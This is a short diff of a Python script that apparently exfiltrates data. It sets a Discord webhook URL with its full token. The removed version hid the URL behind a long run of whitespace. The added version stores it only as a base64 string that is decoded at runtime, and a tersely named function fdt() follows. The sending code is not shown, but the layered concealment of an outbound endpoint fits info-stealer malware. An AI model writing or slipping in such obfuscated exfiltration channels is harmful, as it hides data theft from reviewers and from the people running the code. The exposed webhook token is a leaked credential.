@@ -5,11 +5,10 @@ import requests
 from datetime import datetime
 import base64
 
-                                                                                                                                                                                    webhook = "https://discord.com/api/webhooks/1371488806620102727/H3JEfxFUV7FLNylJK7pQ0riToUWweVSsKA0NIajyVCje6P7MreOEr791FX3DhuM224U5"
-ew = base64.b64encode(webhook.encode()).decode('utf-8')
-DECODED_WEBHOOK = base64.b64decode(ew.encode()).decode('utf-8')
+ew = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTQ4ODgwNjYyMDEwMjcyNy9IM0pFZnFGVFY3RkxOeWxKSzdwUTByaVRvVVd3ZVZTc0tBME5JYmp5VkNqZTZQN01yZU9Fcjc5MUZYM0RodU0yMjRVNQ=="
+dw = base64.b64decode(ew).decode('utf-8')
 
-DISCORD_WEBHOOK_URL = DECODED_WEBHOOK
+DISCORD_WEBHOOK_URL = dw
 
 def fdt():
     t = []
